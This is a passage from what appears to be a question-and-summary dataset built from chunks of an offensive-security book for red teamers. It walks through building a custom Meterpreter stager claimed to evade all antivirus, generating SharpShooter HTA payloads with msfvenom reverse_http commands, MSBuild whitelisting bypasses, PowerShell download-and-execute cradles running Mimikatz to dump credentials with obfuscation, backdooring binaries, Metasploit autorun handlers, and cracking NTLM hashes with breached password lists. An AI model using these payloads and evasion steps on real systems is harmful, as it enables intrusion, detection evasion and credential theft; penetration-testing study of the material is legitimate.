which does\none simple thing: connect back, or listen, in our desired way (reverse_https,\nreverse_tcp, bind_tcp, etc) and then receives a metsrv.dll file. It then loads this\nfile in memory, and executes it. In essence, any Stage 0 payload is just a\nglorified \"download-and-execute\" payload. Because this is how all of Metasploit\nfunctions, there are advanced signatures and heuristics for Metasploit specific\nbehavior in many antivirus solutions - even modifying the shellcode and adding\njunk code will still flag due to the heuristic behavior. To get past this, we write\nour own Stage 0 that performs the same function (download and execute in\nmemory): we mirror the download calls of Meterpreter's reverse_https payload\nto fetch metsrv.dll from the server, and then reflect it in memory and execute it.\nThe specific example payload provided here has some more advanced\nfunctionality. This was done to allow it to be PIC (Position Independent) and\nwith no imports. This code was developed on top of thealpiste's code\n(https://github.com/thealpiste/C_ReverseHTTPS_Shellcode).\nThe example provided performs the following:\nAll code locates DLLs and functions in memory for execution; no\nimports are used. This is accomplished by manually defining stubs\nfor all functions used and then searching for them in memory.\nWininet is used to perform the actual HTTPS requests back to the\nconfigured Metasploit handler.\nmetsrv.dll is received, and the data blob is executed. The way\nMetasploit serves these files means the entry-point is the beginning\nof the buffer.\nThis functionality is the exact same process on how the payloads that are built\ninto msfvenom are executed. However, msfvenom adds these to template\nexecutables in a very predictable, detectable manner, which is not configurable.\nBecause of that, most AV identifies them all the time. Instead, with a little\ncoding know-how, you can re-write the functionality of the payloads, since they\nare small, and bypass any detection which currently exists. This payload is\nknown to bypass all AV, including Windows Defender, at the time of this\nwriting.\nCreating the Payload (Full Payload is located here: http://bit.ly/2ELYkm8):\nIn VS13, open metasploit-\npayloads\\c\\x64_defender_bypass\\x64_defender_bypass.vcxproj\nUnder x64_defender_bypass there is a settings.h file. Open this up\nand modify the HOST and PORT information to your Meterpreter\nhandler information.\nMake sure to set the build to \"Release\" and compile \"x64\"\nSave and build\nunder metasploit-payloads\\c\\x64_defender_bypass\\x64\\Release a\nnew binary \"x64_defender_bypass.exe\" will be created. Execute this\npayload on your victim machine that is running Windows Defender.\nWhen this project was build, Windows Defender did not detect this\npayload.\nYou now have a heavily obfuscated Meterpreter binary and obfuscated transport\nlayer to get around all of the default protections. Now, this was just a proof of\nconcept to get you started. As soon as this book is released, I am sure a\nsignature will be detected for some of these techniques. There is still much more\nyou can do to better evade detection tools. For example, you can:\nBuild with a clang obfuscation toolchain\nUse a String Encryption library for all strings\nChange Meterpreter entry-point (it is currently Init)\nCreate an automated script, adding nops to all the payload types\nEdit the actual ruby for the payload generation to randomize the\npayload's on every run\nSharpShooter\nAs a Red Teamer, one of the most time consuming areas is creating payloads\nthat evade next generation AV and sandboxes. We are constantly looking for\nnew methods to create our initial stagers. One tool, called SharpShooter, takes a\nlot of the anti-sandboxing techniques and James Forshaw’s DotNetToJScript to\nexecute shellcode in Windows scripting formats (CACTUSTORCH tool -\nhttps://github.com/mdsecactivebreach/CACTUSTORCH).\nFrom MDSec's website on SharpShooter, \"SharpShooter supports both staged\nand stageless payload execution. Staged execution can occur over either\nHTTP(S), DNS or both. When a staged payload is executed, it will attempt to\nretrieve a C Sharp source code file that has been zipped and then base64 encoded\nusing the chosen delivery technique. The C Sharp source code will be\ndownloaded and compiled on the host using the .NET CodeDom compiler.\nReflection is then subsequently used to execute the desired method from the\nsource code.” [https://www.mdsec.co.uk/2018/03/payload-generation-using-\nsharpshooter/ ]\nLet's walk through a quick example:\npython SharpShooter.py --interactive\n1 - For .NET v2\nY - Staged Payload\n1 - HTA Payload\nThe following anti-sandbox techniques are available:\nYou can pick your techniques to get around sandboxes\nfrom successfully executing your malware.\n[1] Key to Domain\n[2] Ensure Domain Joined\n[3] Check for Sandbox Artifacts\n[4] Check for Bad MACs\n[5] Check for Debugging\n1 - Web Delivery\nY - builtin shellcode template\nshellcode as a byte array\nOpen a new terminal and create a csharp Meterpreter\npayload\nmsfvenom -a x86 -p windows/meterpreter/reverse_http\nLHOST=10.100.100.9 LPORT=8080\nEnableStageEncoding=True\nStageEncoder=x86/shikata_ga_nai -f csharp\nCopy everything between the \"{\" and \"}\" and submit as\nthe byte array\nProvide URI for CSharp web delivery\nPut in your attacker IP/port and file. Example:\nhttp://10.100.100.9/malware.payload\nProvide name of output file\nmalware\nY - Do you want to smuggle inside HTML?\nUse a custom (1) or predefined (2) template\nFor testing, choose any of the predefined templates\nMove the newly create malicious files to your web directory\nmv output/* varwww/html/\nSet up a Meterpreter handler for your payload\nOnce you configure and develop your malware, move it to the web directory\n(malware.hta, malware.html, malware.payload), start your apache2 service, and\nstart your Meterpreter handler. You are now ready to social engineer your\nvictim into visiting your malicious site! The example given above was\nSharpshooter’s SharePoint online template. When the victim visits your\nmalicious page using IE/Edge, the HTA automatically downloads and prompts\nto run. Once prompted and selected to run, the stager payload will run,\ndownload the secondary payload (if sandbox controls are met), and execute our\nMeterpreter payload in memory.\nAdditional Information:\nhttps://www.mdsec.co.uk/2018/03/payload-generation-using-\nsharpshooter/\nhttps://github.com/mdsecactivebreach/SharpShooter\nApplication Whitelisting Bypass\nWe have talked about the different ways to trigger PowerShell without running\nthe PowerShell code, but what if you can't run custom binaries on the Windows\nSystem? The concept of Application Bypass is to find default Windows binaries\nthat can execute our payloads. We have been on boxes like Domain Controllers\nthat are locked down well and coded execution is limited. There are different\nWindows files we could use to bypass these restrictions—let’s go over a couple\nof them.\nOne Windows binary that is often talked about, which circumvents Application\nWhitelisting, is MSBuild.exe. What is MSBuild.exe and what does it do?\nMSBuild is a default application within the .NET Framework and serves as a\nplatform for building .NET applications using a project file in XML format. We\ncan abuse this feature by creating our own malicious XML project file to execute\na Meterpreter session, using a tool called GreatSCT.\nGreatSCT (https://github.com/GreatSCT/GreatSCT) has various Application\nWhitelisting Bypasses that we can use, but we are just going to cover MSBuild.\nIn this example, we will create a malicious XML file that hosts a reverse_http\nMeterpreter session. This will require us to write the XML file to the victim\nsystem and use MSBuild to execute the XML file:\ngit clone https://github.com/GreatSCT/GreatSCT.git opt\ncd optGreatSCT\npython3 ./gr8sct.py\n[4] MSBUILD/msbuild.cfg\nEnter your host IP [0] and port [1]\ngenerate\nSet up a windows/meterpreter/reverse_http handles in Metasploit\nIn our Kali instance, we used GreatSCT to create the shellcode.xml file, which\nhas both build information and a Meterpreter reverse http shell. This file would\nneed to be moved to our victim system and called, using MSBuild.\n*Note: I do see GreatSCT being actively built on the \"develop\" branch\n(https://github.com/GreatSCT/GreatSCT/tree/develop), which includes https\nMeterpreter and additional whitelisting bypasses. I assume by the time this book\nis released, it will be moved to \"master.\"\nOnce executed on our Windows victim machine, using the command\n\"C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe\nshellcode.xml\", .NET will start to build the shellcode.xml file. During this\nprocess, your victim machine will spawn a reverse http Meterpreter session,\nbypassing any application whitelisting. You may want to edit the shellcode.xml\nfile to put in obfuscated payloads, as the default Meterpreter will most likely\ntrigger AV.\nThere are many different ways to perform Application Whitelisting Bypasses\nthat it would be a book of its own. Here are some additional resources:\nTons of great examples using Windows default executables:\nhttps://github.com/api0cradle/UltimateAppLockerByPassList\nUsing REGSRV32 and PowerShell Empire:\nhttps://www.blackhillsinfosec.com/evade-application-\nwhitelisting-using-regsvr32/\nDLL Execution via Excel.Application RegisterXLL:\nhttps://rileykidd.com/2017/08/03/application-whitelist-\nbypass-using-XLL-and-embedded-shellcode/\nLeveraging INF-SCT Fetch & Execute Techniques For Bypass,\nEvasion, & Persistence:\nhttps://bohops.com/2018/03/10/leveraging-inf-sct-fetch-\nexecute-techniques-for-bypass-evasion-persistence-part-2/\nAppLocker Bypass with Regsvr32:\nhttps://pentestlab.blog/2017/05/11/applocker-bypass-\nregsvr32/\nCode Caves\nAs with any Red Team campaign, we are always looking for creative ways to\nmove laterally within an environment or keep persistence. Usually, if we have\ncredentials, we try to execute payloads on a remote system using WMI or\nPSExec. There are times, though when we need to find creative ways to move\nwithin an environment without being easily tracked.\nAs Red Teamers, getting caught is not the worst thing that can happen during a\ncampaign. It is when we get caught and the Blue team finds every domain, IP,\nand compromised host that was part of the campaign. It is generally pretty easy\nfor Blue teamers to review the WMI/PSExec style connections to identify lateral\nmovement, since it is not always seen as normal traffic. So what can we do to\nhide our lateral movement a bit more?\nThis is where we can get creative and there is no right answer (if it works, that’s\ngood enough for me). One of my favorite things to do once inside an\nenvironment is to identity the public shares and files that are actively\nshared/executed. We could try to add macros to Office files, but that might\ncome off too obvious. One attack that generally has low detection, but high\nsuccess rates, is embedding our custom malware inside executable binaries.\nThis could be a shared binary like putty, a common internal thick client, or even\ndatabase tools.\nAlthough no longer maintained, one of the easiest tools to perform these attacks\nwas called Backdoor factory (https://github.com/secretsquirrel/the-backdoor-\nfactory). Backdoor factory would look for code caves or empty blocks within a\nreal program, where an attacker can inject their own malicious shellcode. This\nwas covered in THP2 and the ideas remain the same.\nTwo great additional resources for backdooring executables can be found here:\nhttps://haiderm.com/fully-undetectable-backdooring-pe-\nfile/#Code_Caves\nhttps://www.abatchy.com/2017/05/introduction-to-manual-\nbackdooring_24.html\nPowerShell Obfuscation\nThe problem with PowerShell Scripts today is that if you are dropping them onto\ndisk, many antivirus tools will pick them up. Even if you import them into\nmemory, AV tools that look in memory may sometimes alert on them, too.\nRegardless, if you are importing them into memory from Cobalt Strike,\nMeterpreter, or PowerShell Empire, it is important to make sure that we don't get\npicked up by AV. If we do, we should, at the very least, make it hard for\nIR/Forensic teams to reverse our attack payloads.\nWe have all seen the commands for PowerShell like this:\nPowershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -\nExecutionPolicy Bypass IEX (New-Object\nNet.WebClient).DownloadString('[PowerShell URL]'); [Parameters]\nThis the most basic combination of strings we might see to bypass the execution\npolicy, run hidden/noninteractive, and to download and execute a PowerShell\npayload. For Blue Teams, we have seen a lot of logging picked up on these\nspecific parameters like \"-Exec Bypass\". So, we started obfuscating this\nparameter by some common PowerShell syntax:\n-ExecutionPolicy Bypass\n-EP Bypass\n-Exec Bypass\n-Execution Bypass\nWhat is even crazier, and I give credit to Daniel Bohannon for identifying this, is\nthat you don't actually need to do the full parameter string to get it to work. For\nexample, for -ExecutionPolicy Bypass, all of these examples will work:\n-ExecutionPolicy Bypass\n-ExecutionPol Bypass\n-Executio Bypass\n-Exec Bypass\n-Ex Bypass\nThese same techniques will work for WindowStyle or even the\nEncodedCommand parameter. Of course, these tricks will only get us so far and\nwe need to create more obfuscated transforms. To start, we can take a very\nsimple example to execute our remote PowerShell script (in this case Mimikatz)\nand dump hashes using an administrative PowerShell Prompt:\nInvoke-Expression (New-Object\nNet.WebClient).DownloadString('http://bit.ly/2JHVdzf'); Invoke-\nMimikatz -DumpCreds\nGoing through (Invoke-Obfuscation), we can take this string and heavily\nobfuscate it using several different techniques:\nOn Windows, download the PowerShell Files for Invoke-\nObfuscation (https://github.com/danielbohannon/Invoke-\nObfuscation)\nLoad PowerShell script and start Invoke-Obfuscation\nImport-Module ./Invoke-Obfuscation.psd1\nInvoke-Obfuscation\nSet your PowerShell Script you want to Obfuscate. In this case, we\nwill obfuscate the Download and Dump Hashes from Mimikatz\nabove.\nSET SCRIPTBLOCK Invoke-Expression (New-Object\nNet.WebClient).DownloadString('http://bit.ly/2JHVdzf');\nInvoke-Mimikatz -DumpCreds\nEncode the Payload\nENCODING\nIn this case, I chose SecureString (AES), but you can play around\nwith all the obfuscation techniques.\nIf you look at the obfuscated string, there is a randomly generated key and an\nencrypted secure string. Upon execution an administrative PowerShell, we still\nget the full payload to execute.\nWe can also go back to the main screen and create obfuscated launchers:\nmain\nlauncher\nCLIP++\nChoose your execution flags\nEven better is that if we look in the Windows PowerShell logs, it is very\nobfuscated and could help evade AV and SEIM alerting tools.\nIn addition to Invoke-Obfuscation, Daniel created a tool that focuses on remote\ndownload cradles called Invoke-CradleCrafter. \"Invoke-CradleCrafter exists to\naid Blue Teams and Red Teams in easily exploring, generating and obfuscating\nPowerShell remote download cradles. In addition, it helps Blue Teams test the\neffectiveness of detections that may work for output produced by Invoke-\nObfuscation but may fall short when dealing with Invoke-CradleCrafter since it\ndoes not contain any string concatenations, encodings, tick marks, type casting,\netc.” [https://github.com/danielbohannon/Invoke-CradleCrafter]\nPowerShell Without PowerShell:\nYou finally get remote code execution on a box, but you find out that you either\ncan't run PowerShell.exe or the company is monitoring PowerShell.exe\ncommands. What are your options to get your PowerShell payload or C2 agents\nrunning on that host system?\nNoPowerShell (NPS)\nI love the concept of NoPowerShell or NPS. NPS, is a Windows Binary that\nexecutes PowerShell through .Net, instead of directly calling PowerShell.exe.\nAlthough this is generally flagged today by AV, we use the same concepts to\ncreate binaries to directly execute our PowerShell malware without needing\nPowerShell.exe. Ben0xA does give you source, so feel free to try to obfuscate\nthe binary to get around AV.\nNPS_Payload (https://github.com/trustedsec/nps_payload)\nAnother take on NPS is a tool by TrustedSec that takes advantage of executing\ncode through MSBuild.exe. This tool generates a PowerShell payload into a\nmsbuild_nps.xml file that is executed when called. The XML file can be called\nby:\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe C:\\\n<path_to_msbuild_nps.xml>\nSharpPick\nSharpPick, a component of PowerPick, is a great tool that allows you to call\nPowerShell without ever calling the PowerShell.exe binary. Within SharpPick,\n\"the RunPS function uses the System.Management.Automation function to\nexecute a script inside of a PowerShell runspace without ever starting a\nPowerShell process.” [ http://www.sixdub.net/?p=555]\nAfter you download SharpPick\n(https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick), you\ncan take your PowerShell Empire payloads and create binaries. A full\nwalkthrough of how to set up your environment and build your payload can be\nfound at:\nhttp://www.sixdub.net/?p=555\nhttps://bneg.io/2017/07/26/empire-without-powershell-exe/\nThere are times when dropping a binary on the host system might not be\npossible. In those cases, we can create a Class Library (DLL file) that we can\ndrop onto the system and execute with \"rundll32.exe\nrunmalicious.dll,EntryPoint\".\nOf course, the creation of these DLLs can be automatically done for Meterpreter\nor Cobalt Strike, but it's nice having the flexibility to run specific PowerShell\npayloads without ever calling PowerShell.exe.\nHideMyPS\nOne tool that I wrote a few years ago, which still has great success is HideMyPS\n(found here: https://github.com/cheetz/hidemyps). This was always just a POC\ntool, but it still works even after all these years. The issue I was running into\nwas that any PowerShell script these days gets picked up by AV. For example,\nif we drop the normal Invoke-Mimikatz.ps1 (http://bit.ly/2H3CNXS) on a\nWindows system with Windows Defender, it will pick up the PowerShell script\ninstantly and send red flags everywhere. This is one of the major flaws of\ntraditional AV and the fact that they generally look for very specific strings in\nmalware. Therefore, I put together a small Python script that takes a PowerShell\nscript and obfuscates all the strings (this was only tested with a few scripts, so it\nis nowhere near production code).\nHideMyPS will find all the functions and obfuscate them using ROT, remove all\ncomments from PowerShell scripts, and cut strings to evade static AV\nsignatures. For the next example, let's take Invoke_Mimikatz.ps1\n(http://bit.ly/2H3CNXS) and obfuscate the PowerShell file:\ncd optHideMyPS\npython hidemyps.py invoke_mimikatz.ps1 [filename.ps1]\nNow, take a look at the difference between the original file and the new file you\ncreated. First off, you can see the function names are all mixed up, variables\nhave been changed, strings have been broken in half, and all the comments are\nmissing.\nThe one thing you have to remember is that we changed all the function names\nin the PowerShell script. So, in order to call the functions, we are going to have\nto look back in our obfuscated file and see what we did to replace \"function\nInvoke-Mimikatz\". In this case, Invoke-Mimikatz was changed to Vaibxr-\nZvzvxngm. The following example was run on a fully-patched Windows 10\nwith Defender completely up-to-date.\nConclusion\nAs Red Teamers or Penetration Testers, it is always going to be a cat and mouse\ngame with host and network detection tools. This is why it is very important to\nbe able to understand how the underlying protections work, write lower-level\ncode to interact directly with Windows APIs versus shell commands, and to\nthink outside the box and get creative. If you focus on only using common tools,\nthe likelihood that you will get detected in a corporate environment is pretty\nhigh. If the tools are public, most likely the security vendors are reversing these\nas quickly as they come out and developing signatures for them. It is up to you\nto take the current attacks and exploit and craft them in a way so that they are\nnot recognized by these vendors.",
    "question": "How can Red Teamers create and configure a Meterpreter payload that evades antivirus detection and network monitoring?",
    "summary": "This text explains how to create and use Meterpreter payloads for reverse shell connections, including generating shellcode and DLLs, configuring the client and server, and bypassing antivirus and network detection. It also covers advanced techniques like using SharpShooter to generate payloads that evade AV, leveraging MSBuild.exe for application whitelisting bypass, and obfuscating PowerShell scripts to avoid detection. Additionally, it discusses methods to embed malware into legitimate binaries and use tools like HideMyPS to further evade static analysis."
  },
  {
    "start": 115,
    "end": 118,
    "text": "8 special teams - cracking, exploits, and tricks\nThis chapter focuses on a handful of different resources that I have found to be\nuseful for both Red Teams and Penetration Testing. These resources may not be\nused in every campaign, but are great for specific scenarios or one-off cases.\nAutomation\nAs heuristic-based endpoint protections get better and better, our attacks need to\nbecome quicker and quicker. We can generally write malware to evade AV and\nget through the initial detections, but once we start making calls like Mimikatz\n(in memory) or moving laterally to another host, we start to set off alarms. To\ncounter this, I always tell Red Teams to get caught on the first attempt. Usually,\nBlue Teams see this as a win when they trigger on our basic/default style (or\nslightly obfuscated) malware, but the real purpose of it is to just learn about their\nenvironment. This is accomplished by our initial payload auto-running multiple\nreconnaissance scripts on the victim’s machine. In the next section, we will go\nover some quick autorun scripts that can help automate some of our attacks.\nAutomating Metasploit with RC scripts\nWith Metasploit, we can efficiently and effectively run our post-exploitation\nscripts using:\nSearch all Post Exploitation Modules in Metasploit\nmsfconsole\nshow post\nFrom the “post” results, select all the modules you want to include for auto-\nexecution when receiving a Meterpreter Shell. In this case, we are going to add\na privilege migrate post exploitation (http://bit.ly/2vn1wFB) to our attack. To\nconfigure the Meterpreter Shell so that it runs this payload on the initial\nconnection from our compromised host, we need to specify an AutoRunScript\nparameter. Feel free to add as many AutoRunScripts as you need to dump\ninformation about the system/network, move laterally, and more!\nCreating a Handler and AutoRunScript:\nCreate a handler file\ngedit handler.rc\nConfigure the handler and autorun scripts\nuse multi/handler\nset payload windows/meterpreter/reverse_https\nset LHOST 10.100.100.9\nset LPORT 443\nset AutoRunScript post/windows/manage/priv_migrate\nset ExitOnSession false\nset EnableStageEncoding true\nexploit -j\nStart handler\nmsfconsole -r handler.rc\nAutomating Empire\nEmpire has similar features to Metasploit’s resource files, which automate many\nof the repetitive tasks. First, we need to create a file (in our example, we will\ncreate a file called optempire_autoload.rc) and then load it within our Empire\ninstance.\nIn a separate terminal window, create a handler file:\ngedit optempire_autoload.rc\nAdd all the post modules you want to execute:\nusemodule\nsituational_awareness/network/powerview/get_user\nexecute\nback\nusermodule\nsituational_awareness/network/powerview/get_computer\nexecute\nback\nWithin Empire, load the autoload.rc resource file:\nagents\nautorun optempire_autoload.rc powershell\nautorun show\nAs you can see, when the agent connected, it automatically ran the get_user and\nget_computer PowerShell scripts. All the results of these scripts will be stored\nin the agent.log file. In this case, our agent name is N6LM348G, so our logs will\nbe stored in optEmpire/downloads/N6LM348G/agent.log.\nAutomating Cobalt Strike\nOne of the main reasons that Cobalt Strike is so powerful is because of the\nAggressor Scripts (https://www.cobaltstrike.com/aggressor-script/index.html).\nWith Cobalt Strike Aggressor Scripts, not only can you configure autorun style\nscripts, but you can also create very complex attacks. For example, I often come\nacross the situation where we get on a shared workstation, like a lab or\nconference room box. One thing I may want our agent to do is run Mimikatz\nevery half hour to pull clear text credentials. With Aggressor Scripts, we can do\nall these actions and more. Here is an example script that does just that:\nmimikatz-every-30m.cna (http://bit.ly/2IXgIel).\nAggressor Collection Scripts:\nhttps://github.com/bluscreenofjeff/AggressorScripts\nhttps://github.com/harleyQu1nn/AggressorScripts\nThe Future of Automation\nLastly, there are some cool projects that are moving toward automation, smart\ncompromise, and APT attacks. I heavily believe that automation of attack is\ngoing to be the future of compromises and we will need the ability to\ntest/validate our security controls. Two tools I see having great potential in\nstarting this automation trend are: Portia - https://github.com/SpiderLabs/portia\nCaldera - https://github.com/mitre/caldera",
    "question": "What are some tools and methods used to automate attacks in the context of Red Teams and Penetration Testing?",
    "summary": "This chapter discusses resources for Red Teams and penetration testing, focusing on automation techniques to evade detection. It covers using AutoRunScripts in Metasploit and Empire to automate post-exploitation tasks like privilege escalation and network reconnaissance. Cobalt Strike's Aggressor Scripts allow for complex, automated attacks, and tools like Portia and Caldera are emerging as key players in the future of automated penetration testing."
  },
  {
    "start": 119,
    "end": 127,
    "text": "Password Cracking\nOne of my newest and most favorite password lists comes from the recent 41GB\npassword dump that contains 1.4 billion username/passwords\n(http://bit.ly/2HqbYk8). Now, I don't want to link directly to the torrent as it\ndoes contain a lot of sensitive usernames (or emails) and associated passwords,\nbut you can search for BreachCompilation.tar.bz2 to find more information\nabout it. Please check with your laws before downloading this very sensitive\ninformation. I do recommend, instead of grabbing the original dump, that you\njust grab the password lists. I have taken the 41GB dump, stripped out all the\nusernames/emails, and made a list of just passwords. It is located here:\nhttp://thehackerplaybook.com/get.php?type=THP-password.\nOn my personal system, I am using 8x Gigabyte GV-N108TTURBO-11GD\nAORUS GeForce GTX 1080 Ti Turbo 11G Graphic Cards. For about $12,000,\nyou can build one of your own, includes a chassis, RAM, power supply, SSD,\nand GPUs. Of course, the chassis will require at least a 4U rackmount (for\nexample: SYS-4028GR-TR2) and plenty of power. Although definitely not\ncheap, we are cracking about 472,000,000,000 hashes per second, and\nbruteforcing NTLM (Windows) hashes. Here is a hashcat benchmark of the\neight GPUs: Hashmode: 1000 - NTLM\nSpeed.Dev.#1.....: 59436.3 MH/s (63.16ms) Speed.Dev.#2.....: 58038.3 MH/s\n(64.70ms) Speed.Dev.#3.....: 59104.4 MH/s (63.55ms) Speed.Dev.#4.....:\n59123.0 MH/s (63.52ms) Speed.Dev.#5.....: 58899.7 MH/s (63.74ms)\nSpeed.Dev.#6.....: 59125.8 MH/s (63.51ms) Speed.Dev.#7.....: 59256.3 MH/s\n(63.36ms) Speed.Dev.#8.....: 59064.5 MH/s (63.56ms) Speed.Dev.#*.....: 472.0\nGH/s For those who can't afford a massive GPU rig, there are other options.\nAlthough still not cheap, you can look into cracking in the cloud. Recently,\nAmazon has integrated TESLA GPUs (not the car)\nhttp://www.nvidia.com/object/tesla-servers.html, which are more powerful than\nthe 1080Tis. There is a great article on the Medium about setting up your own\ncracking servers utilizing these GPUs: https://medium.com/@iraklis/running-\nhashcat-v4-0-0-in-amazons-aws-new-p3-16xlarge-instance-e8fab4541e9b.\nStatics from Iraklis Mathiopoulos article: Hashmode: 1000 - NTLM:\nSpeed.Dev.#1.....: 79294.4 MH/s (33.81ms) Speed.Dev.#2.....: 79376.5 MH/s\n(33.79ms) Speed.Dev.#3.....: 79135.5 MH/s (33.88ms) Speed.Dev.#4.....:\n79051.6 MH/s (33.84ms) Speed.Dev.#5.....: 79030.6 MH/s (33.85ms)\nSpeed.Dev.#6.....: 79395.3 MH/s (33.81ms) Speed.Dev.#7.....: 79079.5 MH/s\n(33.83ms) Speed.Dev.#8.....: 79350.7 MH/s (33.83ms) Speed.Dev.#*.....: 633.7\nGH/s\nThe total speeds for NTLM are about 34% greater than using the TESLA GPU\ncards. The total cost of running AWS is about $25 an hour. So, it is really up to\nyou to figure out your own budget, requirements and goals.\nLab: Recently, Troy Hunt at Have I Been Pwned, released a SHA1 list of\npassword hashes that is about 5.3 GB compressed. This is a very large list from\nprevious breaches and data dumps. This is a great lab to test your password-\ncracking skills:\nhttps://downloads.pwnedpasswords.com/passwords/pwnedpasswords-\n1.0.txt.7z\nAs these GPUs get faster and faster, passwords under 10 characters can be\nsmart-bruteforced in a relatively reasonable timeframe. Some of those might be\ncracked with good password masks, but for the most part, it comes down to\npassword lists. Using password lists from real breaches is one of the fastest\nways to crack passwords larger than 12 characters. Reviewing all the past\nbreaches gives us a good look into how humans create passwords, common\ntechniques to obfuscate passwords, and favorite words to use. Using these lists\nwith complex rule sets, allows us to crack passwords (sometimes greater that\n25+ characters) at an immense speed. But remember, your password list is\ndependent on how well you build and maintain it. As a Red Teamer, we\nregularly track all the accounts we crack, analyze them, and add them to our\nlists. We also constantly monitor for new breaches, pastebin/pastie type sites,\nand more, to find new passwords. A great list to monitor can be found here:\nhttps://inteltechniques.com/OSINT/pastebins.html.\nFavorite Password Lists:\nberzerk0's Real-Password-WPA Password List:\n18.6 GB Uncompressed\nhttp://bit.ly/2EMs6am\nberzerk0's Dictionary-Style List:\n1 GB Uncompressed\nhttp://bit.ly/2GXRNus\nXato's Ten Million Passwords\nmagnet:?\nxt=urn:btih:32E50D9656E101F54120ADA3CE73F7A65EC9D5CB\nHashes.org\nhttps://hashes.org/left.php\nMultiple Gigabytes and growing daily\nCrackstation\n15 GB Uncompressed\nhttps://crackstation.net/files/crackstation.txt.gz\nWeakpass\nTons of password lists\nhttps://weakpass.com/wordlist\nFirst20Hours\nThis repo contains a list of the 10,000 most common\nEnglish words in order of frequency, as determined by n-\ngram frequency analysis of the Google's Trillion Word\nCorpus.\nhttps://github.com/cyberspacekittens/google-10000-\nenglish\nSkullSecurity.org\nGreat older lists of passwords such as rockyou, myspace,\nphpbb\nhttps://wiki.skullsecurity.org/Passwords\nDaniel Miessler's Password Compilation\nhttps://github.com/cyberspacekittens/SecLists\nAdeptus-mechanicus Hash dumps\nhttp://www.adeptus-\nmechanicus.com/codex/hashpass/hashpass.php\nWith a combination of good password lists, we can add rules on top of these lists\nto find even more passwords. In terms of Hashcat, rules define if any\nmodifications need be injected into the wordlist. The best way to describe rules\nis with this easy-to-follow example. We can take and use the\nKoreLogicRulesAppendYears (http://contest-2010.korelogic.com/rules.html) set\nof rules, which looks like the following:\ncAz\"19[0-9][0-9]\"\nAz\"19[0-9][0-9]\"\ncAz\"20[01][0-9]\"\nAz\"20[01][0-9]\"\nIt will append the years from 1949 to 2019 in each and every password. If the\npassword list contained the word \"hacker\", it would try to crack the hash for the\nstring \"hacker1949\" all the way to \"hacker2019\". Remember, the more complex\nrules you have, the more time it will take to finish going through all of the words\nin the word list.\nFortunately, we don't need to create our own rules as there are already plenty of\ngreat rules out there. Of course, there are the default Hashcat rules, which come\nfrom many older breaches, and common password manipulation techniques.\nThese are a great place to start. Kore Rules come from a password competition\nby Korelogic and is one of the other standards out there. Two other rules that\ndefinitely take much longer, but have great detailed rule sets, are NSAKEY and\nthe Hob0Rules. In the past, I would take all the rules, cat them into a single file,\nand unique the file. However, now, NotSoSecure actually does this for you.\nRules:\nHashcat Rules\nhttps://github.com/hashcat/hashcat/tree/master/rules\nKore Rules\nhttp://contest-2010.korelogic.com/rules-hashcat.html\nNSAKEY Rules (One of my favorite) *Forked\nhttps://github.com/cyberspacekittens/nsa-rules\nPraetorian-inc Hob0Rules *Forked\nhttps://github.com/cyberspacekittens/Hob0Rules\nNotSoSecure - One Rule to Rule Them All *Forked\nhttps://github.com/cyberspacekittens/password_cracking_rules\nGotta Crack Em All - Quickly Cracking as Many as\nYou Can\nYou have a huge list of passwords from the Cyber Space Kittens compromise.\nWith a limited amount of time, how can you get the best bang for the buck? The\nfollowing walkthrough will guide you through the initial steps we perform to\ncrack as many passwords as we can. Although, we typically only need to find a\ncouple of Domain Admin/LDAP Admin/Enterprise Admin accounts, my OCD\ntendencies drive me to try and crack all the passwords.\nBefore you start, you really need to understand the password format your\nhashes. Hashcat has a great list of example hashes and what they look like here:\nhttp://hashcat.net/wiki/doku.php?id=example_hashes. Once you understand the\nhash type, it is always good to do some initial test runs to figure out how fast or\nslow the password hashing algorithm is. This will make a huge difference in\nyour password approach. For example, when looking at Windows hashes, we\nsee that NTLM (Windows) performs about 75,000 MH/s. While a common\nLinux hash, SHA-256, performs at a rate of about 5,000 MH/s.\nThis means for a SHA-256 hash, your GPU can guess 5,000,000,000 times a\nsecond. This can seem like a lot, but when you have huge wordlists and large\nrulesets, it might not be enough power. This is because the algorithm for SHA-\n256 is pretty slow and expensive to compute compared to something like\nNTLM, which can do 75,000,000,000 Hashes per second. In our case, we are\ngoing all out, because why not? We will be using eight 1080TI GPUs and using\na fast hash dump of NTLM.\nCracking the CyberSpaceKittens NTLM hashes:\nAfter getting domain admin access, you used your DCSync attack to dump all\nthe hashes from the domain controller. Your goal now is to try to crack as many\nhashes as you can. You know that you will be able to use these accounts in\nfuture campaigns and show your victim company the poor password practices\nthey utilize.\nFirst, we save all the NTLM Windows hashes in a file called cat.txt. To make\nthe output easier for the reader, we are going to omit the initial hashcat execution\ncommands. Every command execution will start with \"hashcat -w 3 -m 1000 -o\nhashes.cracked ./hashes/cat.txt\", which states:\nhashcat: Run hashcat\n-w 3: Using the tuned profile\n-m 1000: Hash format is NTLM\n-o hashes.cracked: The output of the results into a file\n./hashes/cat.txt: Where our hashes are stored\nSo, whenever you see the [hashcat] string, replace it with the following\ncommand: \"hashcat -w 3 -m 1000 -o hashes.cracked ./hashes/cat.txt”. Now, let’s\ncrack the NTLM hashes as quickly and efficiently as we can on our 8 GPU\n1080TI rig.\nCrack all passwords that are 7 characters or less by using the attack\nmode “brute-force” (-a 3) for any alpha, numeric, or special character\n(?a) from one to seven characters in length (--increment).\n[hashcat] -a 3 ?a?a?a?a?a?a?a --increment\nTotal Time is about 5 minutes for 7 characters\nalpha/num/special. We can do 8 characters, but we are\nlooking at a 9-hour run.\nYou can also limit the special characters to a select few\n(!@#$%^) to dramatically decrease the time and\ncomplexity.\nNext, compare all the common password list dumps against our\nhashes. The first file (40GB_Unique_File.txt) is a 3.2GB password\nfile, which takes about 9 seconds to run:\n[hashcat] ./lists/40GB_Unique_File.txt\nAs we can see the speed for even the largest files takes a matter of\nseconds. To improve efficiency, we can actually use the * operator\nand compare against every password list we have in our ./lists/\nfolder.\n[hashcat] ./lists/*\nNext, based on the speed of the hashing algorithm, we can try\ndifferent rule sets on a single password list file. We are going to start\nwith the RockYou rule set that takes about 2 minutes and 9 seconds\nfor these NTLM hashes:\n[hashcat] ./lists/40GB_Unique_File.txt -r ./rules/rockyou-\n30000.rule\nNote: The NSAKEY rule set with the 3GB file is about 7\nminutes and “The one rule to rule them all” rule set from\nNotSoSecure takes about 